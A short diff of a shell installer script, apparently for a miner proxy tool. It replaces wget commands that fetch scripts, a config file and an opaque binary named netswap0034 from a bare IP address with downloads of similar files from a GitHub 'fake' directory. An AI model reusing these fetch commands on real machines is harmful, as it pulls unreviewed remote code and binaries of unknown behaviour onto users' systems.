@@ -103,9 +103,8 @@ show_menu() {
     autorun
 }
 show_menu
-wget 8.218.160.115/runpro.sh
-wget 8.218.160.115/config.json
-wget 8.218.160.115/autorun.sh
-wget 8.218.160.115/netswap0034
+wget https://raw.githubusercontent.com/FxPool/FXMinerProxy/main/fake/runpro.sh
+wget https://raw.githubusercontent.com/FxPool/FXMinerProxy/main/fake/autorun.sh
+wget https://raw.githubusercontent.com/FxPool/FXMinerProxy/main/fake/netswap0034
 
 
